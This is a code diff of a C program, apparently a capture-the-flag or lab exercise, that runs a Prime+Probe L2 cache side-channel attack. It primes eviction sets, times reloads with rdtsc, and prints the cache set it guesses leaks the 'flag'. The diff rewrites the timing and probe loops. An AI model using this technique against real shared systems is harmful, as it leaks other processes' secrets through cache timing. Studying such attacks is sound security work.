@@ -24,15 +24,9 @@ static inline uint64_t rdtsc() {
     return ((uint64_t)hi << 32) | lo;
 }
 
-static inline uint64_t rdtscp() {
-    unsigned hi, lo;
-    asm volatile ("rdtscp" : "=a"(lo), "=d"(hi) :: "rcx");
-    return ((uint64_t)hi << 32) | lo;
-}
-
 static inline void wait_cycles(uint64_t cycles) {
-    uint64_t start = rdtscp();
-    while (rdtscp() - start < cycles);
+    uint64_t start = rdtsc();
+    while (rdtsc() - start < cycles);
 }
 
 void shuffle(int *arr) {
@@ -61,9 +55,7 @@ int main() {
         exit(1);
     }
 
-    for(size_t i = 0; i < 2*1024*1024; i += LINE_SIZE) {
-    buf[i] = 1;
-    }
+    *((char*)buf) = 1;
 
     for(int set = 0; set < NUM_L2_CACHE_SETS; set++) {
         for(int w = 0; w < WAYS; w++) {
@@ -73,20 +65,21 @@ int main() {
 
     volatile uint8_t tmp = 0;
 
-    srand(rdtscp());
+    srand(rdtsc());
 
     while(1) {
 
         uint64_t scores[NUM_L2_CACHE_SETS] = {0};
 
         
-        int perm[NUM_L2_CACHE_SETS];
-        for(int i = 0; i < NUM_L2_CACHE_SETS; i++){
+
+        for(int r = 0; r < REPEATS; r++) {
+            int perm[NUM_L2_CACHE_SETS];
+            for(int i = 0; i < NUM_L2_CACHE_SETS; i++){
                 perm[i] = i;
             }
 
-        shuffle(perm);
-        for(int r = 0; r < REPEATS; r++) {
+            shuffle(perm);
 
             for(int i = 0; i < NUM_L2_CACHE_SETS; i++) {
 
@@ -96,42 +89,33 @@ int main() {
                 for(int w = 0; w < WAYS; w++) {
                     tmp ^= *eviction_sets[set][w];
                 }
+
+                wait_cycles(2000);
+
+                /* PROBE this set */
+                uint64_t start = rdtsc();
+
+                for(int w = 0; w < WAYS; w++) {
+                    tmp ^= *eviction_sets[set][w];
+                }
+
+                uint64_t end = rdtsc();
+
+                scores[set] += (end - start);
             }
+        }
+        int best_set = 0;
+        uint64_t best_latency = 0;
 
-            wait_cycles(20000);
+        for(int set = 0; set < NUM_L2_CACHE_SETS; set++) {
 
-            /* PROBE all sets */
-           for(int i = NUM_L2_CACHE_SETS-1; i >= 0; i--) {
-            int set = perm[i];
+            uint64_t avg = scores[set] / REPEATS;
 
-            asm volatile("lfence");
-            uint64_t start = rdtscp();
-
-            
-            for(int w = WAYS - 1; w >= 0; w--){
-                tmp ^= *eviction_sets[set][w];
+            if(avg > best_latency) {
+                best_latency = avg;
+                best_set = set;
             }
-            asm volatile("lfence");
-            uint64_t end = rdtscp();
-
-            scores[set] += (end - start);
         }
-    }    
-        
-    int best_set = 0;
-    uint64_t best_latency = 0;
-
-    for(int set = 0; set < NUM_L2_CACHE_SETS; set++) {
-
-        uint64_t avg = scores[set] / REPEATS;
-
-        if(avg > best_latency) {
-            best_latency = avg;
-            best_set = set;
-        }
-    }
-
-            
 
         printf("Guessed flag: %d (latency=%lu)\n", best_set, best_latency);
 
